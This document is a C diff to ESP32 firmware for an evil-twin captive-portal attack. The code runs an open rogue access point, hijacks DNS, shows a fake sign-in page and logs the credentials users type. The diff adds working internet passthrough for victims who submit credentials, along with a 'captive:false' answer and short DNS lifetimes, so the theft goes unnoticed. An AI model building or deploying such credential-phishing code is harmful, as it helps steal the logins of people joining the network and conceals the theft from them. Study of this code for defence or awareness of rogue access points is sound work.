@@ -164,6 +164,18 @@ static volatile uint32_t s_captive_dns_q;
 static volatile uint32_t s_captive_http_hits;
 static char              s_captive_last_post[96];
 
+/* Internet sharing (per-client sign-in gate). While the portal runs in APSTA
+ * with an upstream ISP link, a client stays fully DNS-hijacked (every lookup ->
+ * portal) UNTIL it "signs in" (submits any creds). On sign-in its IP is
+ * authorized: the DNS server then FORWARDS that client's lookups to the ISP
+ * resolver and NAPT routes its traffic out the STA uplink -> real internet.
+ * Unauthorized clients still only ever reach the portal. */
+#define CAPTIVE_MAX_AUTH        8
+static uint32_t          s_captive_auth_ips[CAPTIVE_MAX_AUTH];
+static volatile int      s_captive_auth_count;
+static uint32_t          s_captive_upstream_dns;    /* ISP resolver (0 = offline) */
+static bool              s_captive_internet_share;   /* APSTA + NAPT armed */
+
 static void url_decode(const char *src, char *out, size_t out_sz)
 {
     size_t o = 0;
@@ -216,6 +228,72 @@ static void captive_store(const char *user, const char *pass)
     }
     xSemaphoreGive(s_captive_creds_mtx);
     ESP_LOGW(TAG, "Captured credentials: user='%s'", user);
+}
+
+/* Is this client IP allowed real internet (i.e. has it signed in)? */
+static bool captive_ip_authorized(uint32_t ip)
+{
+    if (!s_captive_internet_share || s_captive_upstream_dns == 0 || ip == 0)
+        return false;
+    int n = s_captive_auth_count;            /* snapshot; slot written before count */
+    for (int i = 0; i < n; i++)
+        if (s_captive_auth_ips[i] == ip) return true;
+    return false;
+}
+
+/* Authorize a client for internet passthrough (called when it signs in). Writes
+ * the slot BEFORE bumping the count so the DNS task never sees a half-filled
+ * entry. No-op when internet sharing is off or the table is full. */
+static void captive_authorize_ip(uint32_t ip)
+{
+    if (!s_captive_internet_share || ip == 0) return;
+    int n = s_captive_auth_count;
+    for (int i = 0; i < n; i++)
+        if (s_captive_auth_ips[i] == ip) return;        /* already authorized */
+    if (n < CAPTIVE_MAX_AUTH) {
+        s_captive_auth_ips[n] = ip;
+        s_captive_auth_count  = n + 1;
+        ESP_LOGW(TAG, "Client signed in -> internet granted (%u.%u.%u.%u)",
+                 (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
+                 (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
+    }
+}
+
+/* The IPv4 address of the client that made this HTTP request. */
+static uint32_t captive_req_ip(httpd_req_t *req)
+{
+    int fd = httpd_req_to_sockfd(req);
+    if (fd < 0) return 0;
+    struct sockaddr_in6 sa;
+    socklen_t sl = sizeof(sa);
+    if (getpeername(fd, (struct sockaddr *)&sa, &sl) != 0) return 0;
+    if (sa.sin6_family == AF_INET)
+        return ((struct sockaddr_in *)&sa)->sin_addr.s_addr;
+    /* IPv4-mapped IPv6 (::ffff:a.b.c.d) -> last 4 bytes */
+    uint32_t ip;
+    memcpy(&ip, ((uint8_t *)&sa.sin6_addr) + 12, 4);
+    return ip;
+}
+
+/* Relay an authorized client's DNS query to the upstream ISP resolver and hand
+ * back the real answer. Returns bytes written to `out`, or 0 on failure (caller
+ * then falls back to the hijack). Per-query socket keeps the task stateless. */
+static int captive_dns_forward(const uint8_t *query, int qlen, uint8_t *out, int out_cap)
+{
+    if (s_captive_upstream_dns == 0) return 0;
+    int s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s < 0) return 0;
+    struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    struct sockaddr_in up = { .sin_family = AF_INET, .sin_port = htons(53) };
+    up.sin_addr.s_addr = s_captive_upstream_dns;
+    int got = 0;
+    if (sendto(s, query, qlen, 0, (struct sockaddr *)&up, sizeof(up)) == qlen) {
+        int n = recvfrom(s, out, out_cap, 0, NULL, NULL);
+        if (n > 0) got = n;
+    }
+    close(s);
+    return got;
 }
 
 /* Serve the sign-in page as plain chunks (title interpolated) so the OS
@@ -303,7 +381,10 @@ static esp_err_t login_handler(httpd_req_t *req)
             url_decode(enc, user, sizeof(user));
         if (httpd_query_key_value(query, "password", enc, sizeof(enc)) == ESP_OK)
             url_decode(enc, pass, sizeof(pass));
-        if (user[0] || pass[0]) captive_store(user, pass);
+        if (user[0] || pass[0]) {
+            captive_store(user, pass);
+            captive_authorize_ip(captive_req_ip(req));   /* sign-in -> grant net */
+        }
     }
     snprintf(s_captive_last_post, sizeof(s_captive_last_post),
              "GET qe=%d [%.52s]", (int)qe, query);
@@ -320,8 +401,14 @@ static esp_err_t api_handler(httpd_req_t *req)
 {
     s_captive_http_hits++;
     httpd_resp_set_type(req, "application/captive+json");
-    httpd_resp_sendstr(req,
-        "{\"captive\":true,\"user-portal-url\":\"http://" CAPTIVE_AP_IP "/\"}");
+    /* Already signed in? Tell RFC 8908-aware clients (iOS 14+, Android 11+) the
+     * network is no longer captive so they clear the "sign in" state promptly
+     * instead of waiting for a full connectivity re-probe. */
+    if (captive_ip_authorized(captive_req_ip(req)))
+        httpd_resp_sendstr(req, "{\"captive\":false}");
+    else
+        httpd_resp_sendstr(req,
+            "{\"captive\":true,\"user-portal-url\":\"http://" CAPTIVE_AP_IP "/\"}");
     return ESP_OK;
 }
 
@@ -368,6 +455,18 @@ static void captive_dns_task(void *arg)
         if (n < 12) continue;
         s_captive_dns_q++;
 
+        /* Signed-in client? Forward its lookup upstream and relay the real
+         * answer (NAPT then routes its traffic out the ISP link). If the
+         * upstream fails, fall through and hijack it like everyone else. */
+        if (captive_ip_authorized(from.sin_addr.s_addr)) {
+            uint8_t fwd[512];
+            int fl = captive_dns_forward(buf, n, fwd, sizeof(fwd));
+            if (fl > 0) {
+                sendto(s_captive_dns_sock, fwd, fl, 0, (struct sockaddr *)&from, flen);
+                continue;
+            }
+        }
+
         buf[2] |= 0x80;                 /* QR = response */
         buf[3] |= 0x80;                 /* RA = recursion available */
         buf[6] = 0x00; buf[7] = 0x01;   /* ANCOUNT = 1 */
@@ -379,7 +478,7 @@ static void captive_dns_task(void *arg)
         buf[p++] = 0x00; buf[p++] = 0x01;   /* type A */
         buf[p++] = 0x00; buf[p++] = 0x01;   /* class IN */
         buf[p++] = 0x00; buf[p++] = 0x00;
-        buf[p++] = 0x00; buf[p++] = 0x3C;   /* TTL 60s */
+        buf[p++] = 0x00; buf[p++] = 0x01;   /* TTL 1s — re-resolve almost immediately post-signin */
         buf[p++] = 0x00; buf[p++] = 0x04;   /* RDLENGTH 4 */
         memcpy(buf + p, &ap_ip, 4); p += 4;
 
@@ -403,8 +502,17 @@ esp_err_t wifi_attack_captive_start(const wifi_attack_captive_config_t *config)
             config->portal_title[0] ? config->portal_title : "Sign In",
             sizeof(s_captive_title));
 
-    /* Switch the radio to a dedicated open AP (restored on stop). */
+    /* Switch the radio to a dedicated open AP (restored on stop). Keep the STA
+     * uplink (APSTA) when a station link exists, so signed-in clients can be
+     * NAT'd out to the internet. In APSTA the AP is forced onto the STA channel
+     * by the driver — that's expected. */
+    s_captive_auth_count     = 0;
+    s_captive_internet_share = false;
+    s_captive_upstream_dns   = 0;
     esp_wifi_get_mode(&s_captive_prev_mode);
+    bool have_sta = (s_captive_prev_mode == WIFI_MODE_STA ||
+                     s_captive_prev_mode == WIFI_MODE_APSTA);
+    wifi_mode_t ap_mode = have_sta ? WIFI_MODE_APSTA : WIFI_MODE_AP;
     wifi_config_t ap = {
         .ap = {
             .channel        = config->channel ? config->channel : 1,
@@ -414,7 +522,7 @@ esp_err_t wifi_attack_captive_start(const wifi_attack_captive_config_t *config)
     };
     strlcpy((char *)ap.ap.ssid, config->ssid, sizeof(ap.ap.ssid));
     ap.ap.ssid_len = strlen(config->ssid);
-    if (esp_wifi_set_mode(WIFI_MODE_AP) != ESP_OK ||
+    if (esp_wifi_set_mode(ap_mode) != ESP_OK ||
         esp_wifi_set_config(WIFI_IF_AP, &ap) != ESP_OK) {
         return ESP_ERR_INVALID_STATE;
     }
@@ -441,6 +549,27 @@ esp_err_t wifi_attack_captive_start(const wifi_attack_captive_config_t *config)
          * OSes auto-open the sign-in page. Must be set before DHCP hands leases. */
         dhcps_set_captiveportal_uri("http://" CAPTIVE_AP_IP "/api");
         esp_netif_dhcps_start(ap_netif);
+    }
+
+    /* Internet sharing: if we kept the STA uplink and it has an IP + resolver,
+     * enable NAPT so signed-in clients route out to the real internet. We
+     * deliberately do NOT change the AP's DHCP DNS (it stays 192.168.4.1) — every
+     * client keeps querying OUR DNS server, where the per-client sign-in gate
+     * lives; unauthorized clients only ever reach the portal. */
+    if (ap_mode == WIFI_MODE_APSTA) {
+        esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+        esp_netif_ip_info_t staip = {0};
+        esp_netif_dns_info_t udns = {0};
+        if (sta && esp_netif_get_ip_info(sta, &staip) == ESP_OK && staip.ip.addr != 0
+            && esp_netif_get_dns_info(sta, ESP_NETIF_DNS_MAIN, &udns) == ESP_OK
+            && udns.ip.u_addr.ip4.addr != 0
+            && ap_netif && esp_netif_napt_enable(ap_netif) == ESP_OK) {
+            s_captive_upstream_dns   = udns.ip.u_addr.ip4.addr;
+            s_captive_internet_share = true;
+            ESP_LOGI(TAG, "Captive internet sharing armed (upstream dns=%u.%u.%u.%u)",
+                     (unsigned)(s_captive_upstream_dns & 0xff), (unsigned)((s_captive_upstream_dns >> 8) & 0xff),
+                     (unsigned)((s_captive_upstream_dns >> 16) & 0xff), (unsigned)((s_captive_upstream_dns >> 24) & 0xff));
+        }
     }
 
     s_captive_dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -479,6 +608,15 @@ esp_err_t wifi_attack_captive_stop(void)
         s_captive_dns_sock = -1;
         shutdown(s, SHUT_RDWR); close(s);   /* unblocks the DNS task recvfrom */
     }
+
+    /* Tear down internet sharing: disable NAPT and forget authorized clients. */
+    if (s_captive_internet_share) {
+        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (ap_netif) esp_netif_napt_disable(ap_netif);
+    }
+    s_captive_internet_share = false;
+    s_captive_auth_count     = 0;
+    s_captive_upstream_dns   = 0;
 
     esp_wifi_set_mode(s_captive_prev_mode == WIFI_MODE_NULL ? WIFI_MODE_STA
                                                             : s_captive_prev_mode);
